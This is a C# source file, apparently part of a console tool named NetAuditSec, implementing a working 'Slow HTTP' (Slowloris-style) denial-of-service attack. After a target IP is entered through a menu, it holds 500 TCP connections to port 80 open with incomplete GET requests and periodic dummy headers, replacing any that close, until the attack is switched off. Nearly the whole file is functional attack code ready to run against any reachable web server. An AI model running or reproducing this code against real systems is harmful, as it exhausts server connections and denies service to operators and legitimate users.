using System.Net;
using System.Net.Sockets;
using System.Text;

namespace NetAuditSec
{
    internal class DosSlowHttp
    {
        private readonly string Name = "DoS - Slow HTTP";
        private string IpOfTarget = null;
        private int TargetPort = 80;
        private bool IsAttackActive = false;
        private Thread Dos = null;
        public DosSlowHttp() { }

        public void DosSlowHttpMenu()
        {
            int choice;

        DOS_SLOW_HTTP_MENU:
            Console.Clear();
            Console.WriteLine(this.Name);
            Console.WriteLine(this.CheckIpOfTargetForMenu());
            Console.WriteLine(this.CheckAttackStatusForMenu());
            Console.WriteLine("[3] Back to menu");
            
            Console.Write($"\n{this.Name}> ");
            try
            {
                choice = Int32.Parse(Console.ReadLine());
            }
            catch
            {
                choice = 4;
            }

            switch (choice)
            {
                case 1:
                    this.IpOfTarget = Functions.GetIpAddressOfTarget(this.Name);
                    goto DOS_SLOW_HTTP_MENU;

                case 2:
                    this.HandlingAttack();
                    goto DOS_SLOW_HTTP_MENU;

                case 3:
                    return;

                default:
                    Console.WriteLine("Wrong option...");
                    Thread.Sleep(500);
                    goto DOS_SLOW_HTTP_MENU;
            }
        }

        private string CheckIpOfTargetForMenu()
        {
            if (this.IsSetIpOfTarget())
            {
                return $"IP address of target: {this.IpOfTarget}\nTarget port: {this.TargetPort}\nStatus: {((this.IsAttackActive) ? "active" : "inactive")}\n\n[1] Change IP address of target";
            }
            else
            {
                return "No IP address of target entered\nStatus: inactive\n\n[1] Enter IP address of target";
            }
        }

        private bool IsSetIpOfTarget()
        {
            return this.IpOfTarget != null;
        }

        private string CheckAttackStatusForMenu()
        {
            if (this.IsAttackActive)
            {
                return "[2] Turn off attack";
            }
            else
            {
                return "[2] Turn on attack";
            }
        }

        private void HandlingAttack()
        {
            if (!IsSetIpOfTarget())
            {
                Console.WriteLine("No IP address of target entered...");
                Thread.Sleep(2000);
                return;
            }
            else
            {
                if (this.IsAttackActive) this.TurnOffAttack();
                else this.TurnOnAttack();
            }
        }

        private void TurnOnAttack()
        {
            if(!Net.IsPortOpen(this.IpOfTarget, this.TargetPort))
            {
                Console.WriteLine($"Port {this.TargetPort} is not open...");
                Thread.Sleep(2000);
                return;
            }

            this.IsAttackActive = true;

            this.Dos = new Thread(this.DosAttack);

            this.Dos.Start();
        }

        private void TurnOffAttack()
        {
            this.IsAttackActive = false;
        }

        private void DosAttack()
        {
            IPEndPoint end_point = new IPEndPoint(IPAddress.Parse(this.IpOfTarget), this.TargetPort);

            // creating sockets
            List<Socket> list_of_sockets = new List<Socket>();

            Socket socket;
            byte[] message_to_send;
            int number_of_sockets = 500;
            int count_sockets_diff;

            try
            {
                for (int i = 0; i < number_of_sockets; i++)
                {
                    //init socket
                    socket = new Socket(IPAddress.Parse(this.IpOfTarget).AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                    socket.Connect(end_point);

                    message_to_send = Encoding.ASCII.GetBytes("GET / HTTP/1.1\r\n");
                    socket.Send(message_to_send);
                    message_to_send = Encoding.ASCII.GetBytes($"Host: {this.IpOfTarget}\r\n");
                    socket.Send(message_to_send);
                    //init socket

                    list_of_sockets.Add(socket);
                }
                // creating sockets

                // performing attack
                while (true)
                {
                    if (!this.IsAttackActive)
                    {
                        foreach (Socket s in list_of_sockets)
                        {
                            s.Shutdown(SocketShutdown.Both);
                            s.Close();
                            s.Dispose();
                        }

                        return;
                    }

                    count_sockets_diff = number_of_sockets - list_of_sockets.Count;
                    if (count_sockets_diff > 0)
                    {
                        for (int i = 0; i < count_sockets_diff; i++)
                        {
                            //init socket
                            socket = new Socket(IPAddress.Parse(this.IpOfTarget).AddressFamily, SocketType.Stream, ProtocolType.Tcp);

                            socket.Connect(end_point);

                            message_to_send = Encoding.ASCII.GetBytes("GET / HTTP/1.1\r\n");
                            socket.Send(message_to_send);
                            message_to_send = Encoding.ASCII.GetBytes($"Host: {this.IpOfTarget}\r\n");
                            socket.Send(message_to_send);
                            //init socket

                            list_of_sockets.Add(socket);
                        }
                    }

                    // sending keep-alive headers
                    for (int i = 0; i < list_of_sockets.Count; i++)
                    {
                        try
                        {
                            message_to_send = Encoding.ASCII.GetBytes("X-a: b\r\n");
                            list_of_sockets[i].Send(message_to_send);
                        }
                        catch
                        {
                            try
                            {
                                list_of_sockets[i].Shutdown(SocketShutdown.Both);
                                list_of_sockets[i].Close();
                                list_of_sockets[i].Dispose();
                                list_of_sockets.RemoveAt(i);
                            }
                            catch (ObjectDisposedException) { }
                        }
                    }
                    // sending keep-alive headers
                }
                // performing attack
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);
                System.Environment.Exit(1);
            }
        }
    }
}
